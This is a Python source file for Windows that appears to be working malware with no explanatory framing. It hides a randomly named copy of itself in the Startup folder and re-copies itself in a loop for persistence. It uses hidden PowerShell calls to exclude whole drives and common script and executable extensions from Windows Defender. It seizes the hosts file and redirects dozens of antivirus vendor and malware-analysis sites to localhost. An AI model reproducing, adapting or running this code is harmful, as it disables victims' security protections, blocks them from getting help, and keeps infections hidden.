import os, shutil, sys, time, win32file, subprocess, random, string, threading, ctypes
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) + '.exe'
target_exe = os.path.join(startup_folder, random_name)

def neverstop():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = sys.executable
    
    while True:
        if not os.path.exists(os.path.join(startup_folder, os.path.basename(exe_path))):
            try:
                shutil.copy(exe_path, startup_folder)
            except Exception:
                pass
        time.sleep(0.5)
def pathadd():
    if sys.platform == 'win32' and os.path.basename(sys.executable).lower() == 'systemservice92.exe':
        exe_dir = os.path.dirname(sys.executable)
        os.environ['PATH'] = exe_dir + os.pathsep + os.environ.get('PATH', '')
        subprocess.run(["setx", "PATH", os.environ['PATH']], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
def starttup():
    if not os.path.exists(target_exe):
        shutil.copy2(sys.executable, target_exe)
        win32file.SetFileAttributes(target_exe, win32file.FILE_ATTRIBUTE_HIDDEN)        
def excludeme():
    def add_exclusion(path_or_extension):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.run(
                ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path_or_extension}'"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW,
                check=True,
            )
        except subprocess.CalledProcessError:
            pass

    threads = []
    exclusions = ['C:\\', 'D:\\', '.exe', '.bat', '.vbs', '.py', '.pyw']
    for exclusion in exclusions:
        thread = threading.Thread(target=add_exclusion, args=(exclusion,))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()        
def blocksites():
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        if not os.path.exists(hosts_path):
            open(hosts_path, 'w').close()
        ctypes.windll.shell32.IsUserAnAdmin()
        os.system(f'takeown /f {hosts_path}')
        os.system(f'icacls {hosts_path} /remove "NT AUTHORITY\\TrustedInstaller"')
        with open(hosts_path, "a") as hosts_file:
            hosts_file.write("\n127.0.0.1 virustotal.com\n")
            hosts_file.write("127.0.0.1 www.virustotal.com\n")
            hosts_file.write("127.0.0.1 tria.ge\n")
            hosts_file.write("127.0.0.1 www.tria.ge\n")
            hosts_file.write("127.0.0.1 hybrid-analysis.com\n")
            hosts_file.write("127.0.0.1 www.hybrid-analysis.com\n")
            hosts_file.write("127.0.0.1 any.run\n")
            hosts_file.write("127.0.0.1 www.any.run\n")
            hosts_file.write("127.0.0.1 cuckoosandbox.org\n")
            hosts_file.write("127.0.0.1 www.cuckoosandbox.org\n")
            hosts_file.write("127.0.0.1 malwr.com\n")
            hosts_file.write("127.0.0.1 www.malwr.com\n")
            hosts_file.write("127.0.0.1 apility.io\n")
            hosts_file.write("127.0.0.1 www.apility.io\n")
            hosts_file.write("127.0.0.1 urlscan.io\n")
            hosts_file.write("127.0.0.1 www.urlscan.io\n")
            hosts_file.write("127.0.0.1 abuseipdb.com\n")
            hosts_file.write("127.0.0.1 www.abuseipdb.com\n")
            hosts_file.write("127.0.0.1 metascan-online.com\n")
            hosts_file.write("127.0.0.1 www.metascan-online.com\n")
            hosts_file.write("127.0.0.1 jotti.org\n")
            hosts_file.write("127.0.0.1 www.jotti.org\n")
            hosts_file.write("127.0.0.1 virusscan.jotti.org\n")
            hosts_file.write("127.0.0.1 pastebin.com\n")
            hosts_file.write("127.0.0.1 www.pastebin.com\n")
            hosts_file.write("127.0.0.1 shodan.io\n")
            hosts_file.write("127.0.0.1 www.shodan.io\n")
            hosts_file.write("127.0.0.1 www.avast.com\n")
            hosts_file.write("127.0.0.1 avast.com\n")
            hosts_file.write("127.0.0.1 download.avast.com\n")
            hosts_file.write("127.0.0.1 www.avg.com\n")
            hosts_file.write("127.0.0.1 avg.com\n")
            hosts_file.write("127.0.0.1 download.avg.com\n")
            hosts_file.write("127.0.0.1 www.bitdefender.com\n")
            hosts_file.write("127.0.0.1 bitdefender.com\n")
            hosts_file.write("127.0.0.1 download.bitdefender.com\n")
            hosts_file.write("127.0.0.1 www.kaspersky.com\n")
            hosts_file.write("127.0.0.1 kaspersky.com\n")
            hosts_file.write("127.0.0.1 download.kaspersky.com\n")
            hosts_file.write("127.0.0.1 www.malwarebytes.com\n")
            hosts_file.write("127.0.0.1 malwarebytes.com\n")
            hosts_file.write("127.0.0.1 download.malwarebytes.com\n")
            hosts_file.write("127.0.0.1 www.sophos.com\n")
            hosts_file.write("127.0.0.1 sophos.com\n")
            hosts_file.write("127.0.0.1 download.sophos.com\n")
            hosts_file.write("127.0.0.1 www.norton.com\n")
            hosts_file.write("127.0.0.1 norton.com\n")
            hosts_file.write("127.0.0.1 download.norton.com\n")
            hosts_file.write("127.0.0.1 www.mcafee.com\n")
            hosts_file.write("127.0.0.1 mcafee.com\n")
            hosts_file.write("127.0.0.1 download.mcafee.com\n")
            hosts_file.write("127.0.0.1 www.trendmicro.com\n")
            hosts_file.write("127.0.0.1 trendmicro.com\n")
            hosts_file.write("127.0.0.1 download.trendmicro.com\n")
            hosts_file.write("127.0.0.1 www.windowsdefender.com\n")
            hosts_file.write("127.0.0.1 windowsdefender.com\n")
            hosts_file.write("127.0.0.1 download.windowsdefender.com\n")
            hosts_file.write("127.0.0.1 www.pandasecurity.com\n")
            hosts_file.write("127.0.0.1 pandasecurity.com\n")
            hosts_file.write("127.0.0.1 download.pandasecurity.com\n")
            hosts_file.write("127.0.0.1 www.webroot.com\n")
            hosts_file.write("127.0.0.1 webroot.com\n")
            hosts_file.write("127.0.0.1 download.webroot.com\n")
            hosts_file.write("127.0.0.1 www.f-secure.com\n")
            hosts_file.write("127.0.0.1 f-secure.com\n")
            hosts_file.write("127.0.0.1 download.f-secure.com\n")
            hosts_file.write("127.0.0.1 www.comodo.com\n")
            hosts_file.write("127.0.0.1 comodo.com\n")
            hosts_file.write("127.0.0.1 download.comodo.com\n")
    except Exception as e:
        os.system(f'attrib +h {hosts_path}')
    except:
        pass        